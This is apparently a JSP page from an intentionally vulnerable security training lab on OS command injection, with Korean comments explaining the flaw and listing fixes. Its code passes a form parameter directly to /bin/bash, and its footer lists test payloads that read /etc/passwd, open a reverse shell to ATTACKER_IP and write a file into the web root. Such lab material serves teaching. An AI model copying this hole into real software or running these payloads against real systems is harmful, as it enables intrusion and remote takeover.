<%@ page contentType="text/html; charset=UTF-8" %>
<%@ page import="java.io.*" %>
<%
  // [VULN] OS Command Injection - 사용자 입력을 Runtime.exec()에 전달
  // [FIX] 1) 명령 실행 자체를 제거 (가장 좋은 방법)
  //       2) 불가피하면 화이트리스트 명령만 허용
  //       3) ProcessBuilder에 인자를 배열로 전달 (쉘 해석 방지)
  //         new ProcessBuilder("ping", "-c", "3", validatedHost).start()

  String cmd = request.getParameter("cmd");
  if (cmd == null) cmd = "";
  String output = "";

  if (!cmd.isEmpty()) {
      try {
          // [VULN] 쉘을 통해 실행하므로 ; | && 등 메타문자로 명령 체인 가능
          Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
          BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
          BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
          StringBuilder sb = new StringBuilder();
          String line;
          while ((line = br.readLine()) != null) sb.append(line).append("\n");
          while ((line = er.readLine()) != null) sb.append(line).append("\n");
          p.waitFor();
          output = sb.toString();
      } catch (Exception e) {
          output = "Error: " + e.getMessage();
      }
  }
%>
<html>
<head><title>Command Injection Lab</title></head>
<body>
<h2>OS Command Injection</h2>
<form method="POST">
  명령어: <input type="text" name="cmd" value="" size="60">
  <input type="submit" value="실행">
</form>

<% if (!output.isEmpty()) { %>
  <h3>결과:</h3>
  <pre><%=output.replace("<","&lt;").replace(">","&gt;")%></pre>
<% } %>

<hr>
<h3>테스트 페이로드</h3>
<pre>
기본:           id
체이닝:         id; cat /etc/passwd
파이프:         cat /etc/passwd | grep root
리버스 쉘:     bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1
파일 쓰기:     echo 'webshell' &gt; ../webapps/ROOT/shell.txt
</pre>
<a href="index.jsp">← 메인</a>
</body>
</html>
